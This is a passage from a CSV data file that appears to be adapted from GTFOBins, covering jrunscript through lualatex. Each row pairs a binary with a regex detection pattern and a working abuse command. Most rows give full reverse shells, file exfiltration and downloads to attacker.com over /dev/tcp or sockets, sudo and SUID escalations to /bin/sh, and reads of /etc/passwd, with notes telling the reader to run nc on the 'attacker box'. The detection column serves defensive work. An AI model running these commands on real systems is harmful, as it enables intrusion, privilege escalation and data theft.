var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
jrunscript,file-download,"jrunscript -e ""cp('$URL','$LFILE')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
jrunscript,file-write,"jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jrunscript,file-read,"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
jrunscript,suid,"./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-p\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This has been found working in macOS but failing on Linux systems.
jrunscript,sudo,"sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
jtag,shell,"jtag --interactive
shell /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jtag\s*\-\-interactive\s+(?:/bin/(?:sh|bash))),
jtag,sudo,"sudo jtag --interactive
shell /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?jtag\s*\-\-interactive\s+(?:/bin/(?:sh|bash))),
julia,shell,julia -e 'run(`/bin/sh`)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:/bin/(?:sh|bash))),
julia,file-read,"export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
julia,file-write,"export LFILE=file_to_write
julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
julia,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV[""URL""], ENV[""LFILE""])'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
julia,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
julia,suid,./julia -e 'run(`/bin/sh -p`)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s*\-p\s+(?:/bin/(?:sh|bash))),
julia,sudo,sudo julia -e 'run(`/bin/sh`)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+(?:/bin/(?:sh|bash))),
knife,shell,"knife exec -E 'exec ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?knife\s*\-E\s+(?:/bin/(?:sh|bash))),
knife,sudo,"sudo knife exec -E 'exec ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?knife\s*\-E\s+(?:/bin/(?:sh|bash))),
ksh,shell,ksh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s+.+),
ksh,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-i\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
ksh,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-e\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
ksh,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
ksh,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-r\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
ksh,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file."
ksh,file-write,"export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ksh,file-read,"export LFILE=file_to_read
ksh -c 'echo ""$(<$LFILE)""'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",It trims trailing newlines.
ksh,file-read,"export LFILE=file_to_read
ksh -c $'read -r -d \x04 < ""$LFILE""; echo ""$REPLY""'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-r\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",It trims trailing newlines.
ksh,suid,./ksh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-p\s+.+),
ksh,sudo,sudo ksh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksh\s+.+),
ksshell,file-read,ksshell -i $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ksshell,suid,./ksshell -i $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ksshell,sudo,sudo ksshell -i $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ksu,sudo,sudo ksu -q -e /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ksu\s*\-q\s*\-e\s+(?:/bin/(?:sh|bash))),
kubectl,file-upload,kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s*\-\-address\s*\-\-port\s*\-\-www\s*\-\-www\-prefix\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
kubectl,suid,./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s*\-\-address\s*\-\-port\s*\-\-www\s*\-\-www\-prefix\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
kubectl,sudo,sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s*\-\-address\s*\-\-port\s*\-\-www\s*\-\-www\-prefix\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
latex,shell,latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
latex,file-read,"latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
latex,sudo,"sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
latex,sudo,sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
latex,limited-suid,./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
latexmk,shell,"latexmk -e 'exec ""/bin/sh"";'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+(?:/bin/(?:sh|bash))),
latexmk,shell,latexmk -latex='/bin/sh #' /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s+(?:/bin/(?:sh|bash))),
latexmk,file-read,"latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
latexmk,file-read,"echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
strings tmp.dvi","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
latexmk,sudo,"sudo latexmk -e 'exec ""/bin/sh"";'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+(?:/bin/(?:sh|bash))),
ld.so,shell,/lib/ld.so /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s+(?:/bin/(?:sh|bash))),
ld.so,suid,./ld.so /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s*\-p\s+(?:/bin/(?:sh|bash))),
ld.so,sudo,sudo /lib/ld.so /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s+(?:/bin/(?:sh|bash))),
ldconfig,sudo,"echo ""$TF"" > ""$TF/conf""
sudo ldconfig -f ""$TF/conf""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ldconfig\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
ldconfig,limited-suid,"echo ""$TF"" > ""$TF/conf""
./ldconfig -f ""$TF/conf""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ldconfig\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
less,shell,"less /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+(?:/bin/(?:sh|bash))),
less,shell,v,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),
less,shell,"less /etc/profile
v:shell",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),
less,file-read,less file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),
less,file-read,"less /etc/profile
:e file_to_read",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),This is useful when `less` is used as a pager by another binary to read a different file.
less,file-write,"echo DATA | less
sfile_to_write
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
less,file-write,"less file_to_write
v",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),This invokes the default editor to edit the file. The file must exist.
less,sudo,"sudo less /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+(?:/bin/(?:sh|bash))),
less,suid,./less file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?less\s+.+),
lftp,shell,lftp -c '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+(?:/bin/(?:sh|bash))),
lftp,limited-suid,./lftp -c '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+(?:/bin/(?:sh|bash))),
lftp,sudo,sudo lftp -c '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+(?:/bin/(?:sh|bash))),
links,file-read,"links ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?links\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
links,suid,"./links ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?links\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
links,sudo,"sudo links ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?links\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ln,sudo,"sudo ln -fs /bin/sh /bin/ln
sudo ln",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ln\s+(?:/bin/(?:sh|bash))),
loginctl,shell,"loginctl user-status
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?loginctl\s+(?:/bin/(?:sh|bash))),
loginctl,sudo,"sudo loginctl user-status
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?loginctl\s+(?:/bin/(?:sh|bash))),
logsave,shell,logsave /dev/null /bin/sh -i,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s+(?:/bin/(?:sh|bash))),
logsave,sudo,sudo logsave /dev/null /bin/sh -i,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s+(?:/bin/(?:sh|bash))),
logsave,suid,./logsave /dev/null /bin/sh -i -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s*\-p\s+(?:/bin/(?:sh|bash))),
look,file-read,"look '' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?look\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
look,suid,"./look '' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?look\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
look,sudo,"sudo look '' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?look\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lp,file-upload,lp $LFILE -h $RHOST,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lp\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","To collect the file run the following on the attacker box (this requires `cups` to be installed):

1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
2. `lpadmin -d printer` to set the new printer as default;
3. `cupsctl --remote-any` to enable printing from the Internet;
4. `nc -lkp 9100` to receive the file.

Send a local file to a CUPS server.
"
ltrace,file-read,ltrace -F $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files."
ltrace,file-write,ltrace -s 999 -o $LFILE ltrace -F DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-s\s*\-o\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`."
ltrace,shell,ltrace -b -L /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-b\s*\-L\s+(?:/bin/(?:sh|bash))),
ltrace,sudo,sudo ltrace -b -L /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-b\s*\-L\s+(?:/bin/(?:sh|bash))),
lua,shell,"lua -e 'os.execute(""/bin/sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:/bin/(?:sh|bash))),
lua,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.
lua,non-interactive-bind-shell,"export LPORT=12345
lua -e 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.
lua,file-upload,"lua -e '
local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires `lua-socket` installed."
lua,file-download,"export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires `lua-socket` installed."
lua,file-write,"lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lua,file-read,"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lua,suid,"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lua,sudo,"sudo lua -e 'os.execute(""/bin/sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:/bin/(?:sh|bash))),
lua,limited-suid,"./lua -e 'os.execute(""/bin/sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+(?:/bin/(?:sh|bash))),
lualatex,shell,"lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
lualatex,sudo,"sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
lualatex,limited-suid,"./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
